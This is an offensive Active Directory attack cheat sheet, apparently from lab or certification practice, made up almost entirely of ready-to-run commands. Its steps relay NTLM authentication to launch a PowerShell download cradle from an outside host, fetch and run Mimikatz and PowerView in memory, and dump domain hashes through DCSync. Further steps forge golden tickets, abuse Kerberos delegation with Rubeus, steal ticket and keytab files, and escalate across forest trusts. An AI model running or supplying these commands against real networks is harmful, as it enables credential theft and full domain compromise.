# Active Directory Cheat Sheet

## NTLM Relay
```powershell
sudo proxychains impacket-ntlmrelayx --no-http-server -smb2support -t 172.16.216.152 -c 'C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -c iex(iwr -useb http://192.168.45.185/run.txt)'
```

## BloodHound
```powershell
neo4j console
. .\Downloads\SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All -Domain XXX.local -ZipFileName loot.zip
```

## AD Object Security Permission

### Write DACL & Add Group Member
```powershell
(new-object system.net.webclient).downloadstring('http://192.168.45.185/powerview.txt') | IEX
Add-DomainObjectAcl -TargetIdentity "MailAdmins" -Rights All -PrincipalIdentity 'sqlsvc' -Verbose
(new-object system.net.webclient).downloadstring('http://192.168.45.185/Add-NetGroupUser.ps1') | IEX
Add-NetGroupUser -UserName SQLSVC -GroupName "MAILADMINS" -Domain "TRICKY.COM"
Invoke-Mimikatz -Command ' "kerberos::purge" "lsadump::dcsync /domain:tricky.com /user:tricky\administrator" '
```


### Check Generic All
**Logic**: Use GenericAll permission → modify related password to gain access
```powershell
# Check Generic All
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}

# Exploitation 
net user [UserName] [Password] /domain
net group [UserGroup] [UserName] /add /domain
```

### Check DACL
**Logic**: Use WriteDACL to modify the access → GenericAll permission → modify related password to gain access
```powershell
# Check WriteDACL
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}

#Change Permission to Generic ALL
Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All

# Recheck
Get-ObjectAcl -Identity testservice2 -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

## Kerberos Operation (Linux)
### General Command
```bash
#Checking if Kerberos exists
env | grep KRB5CCNAME

#Initiate of Keberos TGT
kinit

#Checking existing TGT
klist

#Checking SPNs
ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -D "Administrator@CORP1.COM" -W -b "dc=corp1,dc=com" "servicePrincipalName=*" servicePrincipalName

#Initiate ST
kvno MSSQLSvc/DC01.corp1.com:1433
```

### Path 1: Stealing Ticket File 
**Logic**: Steal ticket file (with sudo right) → Change Ticket Owner → Request TGT and ST
```bash
sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow
sudo chown offsec:offsec /tmp/krb5cc_minenow
kdestroy
klist
export KRB5CCNAME=/tmp/krb5cc_minenow
kvno MSSQLSvc/DC01.corp1.com:1433
```

**Impacket Version with proxychain**
```bash
#In Victim
ssh offsec@linuxvictim -D 9050

#Example of operation
proxychains python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@DC01.CORP1.COM -k -no-pass
```

### Path 2: Stealing KeyTab File
**Logic**: Steal Ticket File (Incorrect permission configured) → Kinit
```bash
#Kinit using keytab file
kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab

#SMB For testin
smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$
```
## Kerberos Operation (Windows)
### Unconstrainted Delegation
**Logic**: Use WriteDACL to modify the access → GenericAll permission → modify related password to gain access
```powershell
# Check Unconstrainted Delegation
Get-DomainComputer -Unconstrained

# Export Ticket
sekurlsa::tickets /export

# Import again to elevate permission
kerberos::ptt [0;9eaea]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi

# DC Sync
lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
```

### Constrainted Delegation
**Logic**: Check TrustedtoAuth firled for the user (**msds-allowedtodelegateto**) → Generate TGT → S4U Authentication → Modify authentication for alt service 
```powershell
# Check Trusted to Auth
Get-DomainUser -TrustedToAuth

#Generate TGT
.\Rubeus.exe hash /password:lab
.\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E

#Perform authentication/ alt service authentication
.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt
.\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /altservice:CIFS /ptt
```

### Resource Constrainted Constrainted Delegation
**Logic**: GenericAll on Computer Object → Check Machine Account Quota → Creat Machine Account and put into msDS-AllowedToActOnBehalfOfOtherIdentity → Create S4U 
```powershell
# Check GenericAll
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}

# Check Machine Account Quota
Get-DomainObject -Identity prod -Properties ms-DS-MachineAccountQuota

# Add Machine Account
. .\powermad.ps1
New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
Get-DomainComputer -Identity myComputer

# Check SID and Convert to Binary Formmat
$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)

#Assign Binary format SID into msds-allowedtoactonbehalfofotheridentity
Get-DomainComputer -Identity appsrv01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
$Descriptor.DiscretionaryAcl
.\Rubeus.exe hash /password:h4x
.\Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt
```

## Within Forest Operation
**Logic**: Check Forest Trust first (Direct_Inbound & Direct_Outbound) inside **Flags**
**Key**: TrustAttributes: WITHIN_FOREST (Inside Same Forest), FOREST_TRANSITIVE (Outside Forest)
### Enumeration
```powershell
Get-DomainTrust -API
Get-DomainTrust
Get-DomainUser -Domain corp1.com
```
**Logic**: SYSTEM at Primary Domain (Prod.corp1.com) + Corp1$ NTLM Hash inside Prod.corp1.com → SYSTEM at Secondary Domain (Corp1.com)
```powershell
#Mimikatz Get Domain Hash
lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt

Get-DomainSID -Domain prod.corp1.com 
Get-DomainSid -Domain corp1.com 

kerberos::golden /user:h4x /domain:<Domain Name> /sid:<Domain SID> /krbtgt:<NTLM of KRBTGT> /sids:<External Forest Enterprise Admin SID> /ptt
```

## Extra-Forest Operation
### Enumeration
**Attack Path 1:** Enumeration of External Trusted Group → Compromise the account → Gain Extenral Forest 
**Attack Path 2:** Gain KRBTGT Hash → SIDS 
**ATtack Path 3:** Gain LinkedSQL in both domains
```powershell
#PowerView 
Get-DomainTrustMapping

#Check groups in a trusted forest or domain that contains non-native members
#Compromise this account can easily gain access to the forest
#Check MemberName: SID field
Get-DomainForeignGroupMember -Domain corp2.com 
convertfrom-sid <SID>

#Check LinkedSQL
setspn -T prod -Q MSSQLSvc/*
```

### Exploitation
```powershell
lsadump::dcsync /domain:corp1.com /user:corp1\krbtgt
Get-DomainSID -domain corp1.com
Get-DomainSID -domain corp2.com

#Check Forest Group SID must be larger than 1000, it must be > 1000 (Custom Group in External Forest)
Get-DomainGroupMember -Identity "Administrators" -Domain corp2.com
kerberos::golden /user:h4x /domain:<Domain> /sid:<Domain SID> /krbtgt:<Domain NTLM Hash of KRBTGT> /sids:<External Forest Enterprise Admin SID Custom Group>  /ptt
```


### Mimikatz/Rubeus PTT
```powershell
#Mimikatz
#Pass the Hash
sekurlsa::pth /domain:infinity.com /ntlm:[] /user:ted /run:cmd.exe

# Mimikatz Pass the Ticket
(new-object system.net.webclient).downloadstring('http://192.168.45.185/Invoke-Mimikatz.ps1') | IEX
Invoke-Mimikatz -Command ' "kerberos::golden /domain:tricky /rc4:[] /user:sqlsvc /target:dc04 /ptt" '
Invoke-Mimikatz -Command ' "lsadump::dcsync /domain:tricky.com /user:tricky\administrator" '

kerberos::golden /domain:infinity.com /ntlm:[] /user:ted /target:dc03 /ptt
misc::cmd


# Mimikatz DC SYNC
lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt

# Rubeus Pass the Ticket
.\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:[] /ptt
Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...
```
